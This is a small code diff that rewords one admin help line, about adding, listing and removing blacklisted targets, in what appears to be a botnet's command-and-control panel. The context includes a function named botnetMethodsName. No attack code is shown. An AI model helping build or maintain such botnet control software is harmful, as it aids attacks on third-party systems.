@@ -49,7 +49,7 @@ banner = f'''
 admin_commands = f"""
 {gray}Admin Commands:
 {lightwhite}!USER               {gray}Add/List/Remove users
-{lightwhite}!BLACKLIST          {gray}Black List targets
+{lightwhite}!BLACKLIST          {gray}Add/List/Remove BlackList targets
 """
 
 def botnetMethodsName(method):
